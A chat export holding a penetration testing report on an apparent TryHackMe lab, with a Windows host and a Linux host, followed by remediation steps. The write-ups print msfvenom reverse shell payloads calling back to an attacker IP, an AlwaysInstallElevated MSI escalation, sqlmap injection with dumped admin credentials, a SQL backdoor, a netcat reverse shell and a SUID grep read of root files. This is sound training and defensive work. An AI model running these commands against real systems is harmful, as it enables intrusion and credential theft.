Sumaiya Hossain, [16/8/2025 10:14]
Penetration Testing Report: Network Security Assessment  
Report Date: August 16, 2025  
Target: 
Network Environment including 10.200.150.151 (Windows) and 
10.200.150.152 (Linux)  



Report Summary  
This penetration testing report details the security assessment of the network environment, targeting a Windows system (10.200.150.151) and a Linux system (10.200.150.152), conducted between August 15–16, 2025. The assessment employed black-box methodology, simulating an unauthenticated external attacker, and identified critical vulnerabilities enabling full system compromise. The attack paths leveraged reverse shell payloads, insecure registry configurations, SQL injection, and misconfigured SUID binaries, resulting in unauthorized access and privilege escalation to NT AUTHORITY\SYSTEM on Windows and root on Linux.  

Key findings include:  

Windows (10.200.150.151): Unrestricted file uploads and AlwaysInstallElevated registry settings allowed initial access as the `hr` user and escalation to NT AUTHORITY\SYSTEM, exposing `THM{884a8fcd-7d9d-429c-97c2-a456c304206e}` (user.txt) and `THM{6e9a8f94-7e2a-4aa0-adb9-1eaa3e687749}` (root.txt).  
Linux (10.200.150.152): SQL injection in the login endpoint and an insecure SUID configuration on /usr/bin/grep enabled database access and root escalation, revealing THM{b289f151-cc7d-4a31-aa70-2772c5fafcb8} (root.txt).  

These vulnerabilities pose high to critical risks, with abstracted CVSS scores ranging from 9.0 to 9.8, threatening data confidentiality, integrity, and availability. Immediate remediation is recommended to prevent exploitation, with detailed vulnerability write-ups provided below.


Vulnerability Write-ups

Vulnerability Name: Unrestricted File Upload  
Risk Rating: High (CVSS v3.1 Base Score: 9.1 - AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)  
Flag Value: THM{884a8fcd-7d9d-429c-97c2-a456c304206e}  
Description of Vulnerability and How It Was Identified:  
An unrestricted file upload vulnerability was identified in a custom application on the Windows target (10.200.150.151). The application allowed uploading arbitrary files, including executables, without type validation. This was discovered by creating a reverse shell payload using msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.250.1.6 LPORT=1234 -f exe -o 1234.exe.pdf and uploading it to http://10.200.150.151/. A netcat listener (nc -lvnp 1234) confirmed a connection, granting access to the C:\ directory as the hr user, with the flag THM{884a8fcd-7d9d-429c-97c2-a456c304206e} retrieved from C:\Users\hr\Desktop\user.txt.  
Root Cause: Lack of server-side file type validation and executable file execution in upload directories.  

Remediation Actions to Resolve Root Cause of the Vulnerability:  
1. Input Validation: Implement strict file type whitelisting (e.g., .jpg, .pdf) using server-side checks.  
   Method: Modify application code to validate MIME types and extensions with a library like Python’s mimetypes.  
   Test: Upload 1234.exe.pdf, expect rejection.  
2. Secure Storage: Store uploaded files in a non-executable directory (e.g., /uploads/) with restricted permissions.  
   Method: Configure IIS or Apache to set +x off for upload directories.  
   Test: Attempt execution, expect failure.  
3. Application Whitelisting: Deploy a policy to block unapproved executables.  
    Method: Use Windows Defender Application Control or AppLocker.  
    Test: Run unauthorized executable, expect block.  
4. Logging: Enable upload attempt logging.  
   Method: Add logs with EventLog in application code.  
   Test: Check logs post-upload.  
Validation: Re-test with original payload, expecting no shell, and scan with Nessus.



Sumaiya Hossain, [16/8/2025 10:14]
Vulnerability Name: Insecure Registry Configuration (AlwaysInstallElevated)  
Risk Rating: Critical (CVSS v3.1 Base Score: 9.8 - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)  
Flag Value: THM{6e9a8f94-7e2a-4aa0-adb9-1eaa3e687749}  
Description of Vulnerability and How It Was Identified:  
The AlwaysInstallElevated registry setting was enabled in both 

HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer 
and 
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer 

on 10.200.150.151, allowing MSI files to run with NT AUTHORITY\SYSTEM privileges. This was identified by querying the registry with 

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer 
and 
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

, confirming a value of 1. A malicious MSI payload was created with msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.250.1.6 LPORT=8888 -f msi -o shell.msi, executed via msiexec /quiet /i shell.msi, and a Metasploit multi/handler confirmed escalation, retrieving THM{6e9a8f94-7e2a-4aa0-adb9-1eaa3e687749} from C:\Users\Administrator\Desktop\root.txt.  
Root Cause: Misconfigured registry settings enabling elevated MSI execution without authentication.  




Remediation Actions to Resolve Root Cause of the Vulnerability: 

1. Disable AlwaysInstallElevated: Set the registry value to 0 in both locations.  
   - Method: Run reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 0 /f and repeat for HKCU.  
   - Test: Install shell.msi, expect failure.  
2. Restrict Registry Access**: Limit write access to non-administrative users.  
   - Method: Use secpol.msc to adjust permissions on registry keys.  
   - Test: Attempt modification as a standard user, expect denial.  
3. Patch Management: Update Windows to the latest version to address related vulnerabilities.  
   - Method: Run wuauclt.exe /detectnow and install updates.  
   - Test: Verify version with winver.  
4. Audit Configuration: Regularly review registry settings.  
   - Method: Script with PowerShell (Get-ItemProperty).  
   - Test: Check post-audit for anomalies.  
   - Validation: Re-test with original MSI, expecting no escalation, and scan with Microsoft Baseline Security Analyzer.

Vulnerability Name: SQL Injection  

Risk Rating: Critical (CVSS v3.1 Base Score: 9.8 - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)  
Flag Value: N/A (Database Access, Precursor to Root Flag)  
Description of Vulnerability and How It Was Identified:  
A SQL injection vulnerability was found in the /includes/user_login.php endpoint on 10.200.150.152, targeting the email parameter. This was identified using sqlmap -u "http://10.200.150.152:1200/includes/user_login.php" --data="email=test&password=test" --batch, which confirmed injection and dumped the sequel database, revealing admin credentials (admin@sequel.thm:zxQY7tN1iUz9EJ3l8zWezxQY7tN1iUz9EJ3l8zWe). 

Stacked queries ('; SELECT INTO OUTFILE '/tmpbvyod.php' #) created a backdoor, and a netcat reverse shell (nc -e /bin/sh 10.250.1.6 4444) established access as www-data.  
Root Cause: Lack of input sanitization and permissive MySQL settings allowing stacked queries.  

Remediation Actions to Resolve Root Cause of the Vulnerability:  
1. Use Prepared Statements: Implement parameterized queries in PHP (e.g., PDO).  
   - Method: Replace mysql_query with $stmt = $pdo->prepare("SELECT * FROM users WHERE email = ?"); $stmt->execute([$email]);.  
   - Test: Inject ' OR 1=1 --, expect no results.  
2. Disable Stacked Queries: Configure MySQL to reject multiple statements.  
   - Method: Set multi_statements=0 in my.cnf.  
   - Test: Run stacked query, expect error.  
3. Input Sanitization: Add server-side filtering.  
   - Method: Use filter_var($email, FILTER_SANITIZE_EMAIL).  
   - Test: Inject malicious input, expect sanitization.  
4. WAF Deployment: Install a Web Application Firewall.  
   - Method: Configure ModSecurity with SQLi rules.  
   - Test: Attempt injection, expect block.  
   - Validation: Re-test with sqlmap, expecting no dump, and scan with OWASP ZAP.

Sumaiya Hossain, [16/8/2025 10:14]
Vulnerability Name: Insecure SUID Configuration  
Risk Rating: Critical (CVSS v3.1 Base Score: 9.0 - AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)  
Flag Value: THM{b289f151-cc7d-4a31-aa70-2772c5fafcb8}  
Description of Vulnerability and How It Was Identified:  
An insecure SUID bit on /usr/bin/grep was identified on 10.200.150.152, allowing the www-data user to read root files. This was discovered using linpeas.sh, which listed SUID binaries with find / -perm -u=s -type f, revealing /usr/bin/grep with unexpected privileges. Executing /usr/bin/grep -r "" /root/root.txt retrieved THM{b289f151-cc7d-4a31-aa70-2772c5fafcb8}, confirming root access.  
- Root Cause: Unnecessary SUID assignment violating least privilege principles.  

Remediation Actions to Resolve Root Cause of the Vulnerability:  
1. Remove SUID Bit: Disable SUID on /usr/bin/grep.  
   - Method: Run chmod u-s /usr/bin/grep.  
   - Test: Attempt root file read, expect permission denied.  
2. Audit SUID Binaries: Review all SUID files for legitimacy.  
   - Method: Use find / -perm -u=s -type f 2>/dev/null and document findings.  
   - Test: Verify only essential binaries retain SUID.  
3. Restrict Permissions: Limit www-data access to web directories.  
   - Method: Set chown root:root /var/www/html; chmod 755 /var/www/html.  
   - Test: Attempt access outside web root, expect failure.  
4. Monitoring: Enable file permission change alerts.  
   - Method: Configure auditd with auditctl -w /usr/bin/grep -p wa.  
   - Test: Modify permissions, check logs.  
- Validation: Re-test with original command, expecting no access, and scan with Lynis.


Conclusion and Recommendations  
The identified vulnerabilities on 10.200.150.151 and 10.200.150.152 enabled complete system compromises, exposing sensitive data and granting root-level access. Immediate remediation is critical, with a target completion date of August 18, 2025, and validation by August 19, 2025. Regular patching, configuration audits, and network segmentation are recommended to prevent future exploitation.

Sumaiya Hossain, [16/8/2025 10:14]
this is my network part

Sumaiya Hossain, [16/8/2025 10:15]
Someone kindly merge this as a pdf

Sumaiya Hossain, [16/8/2025 10:15]
if it's good and be help to someone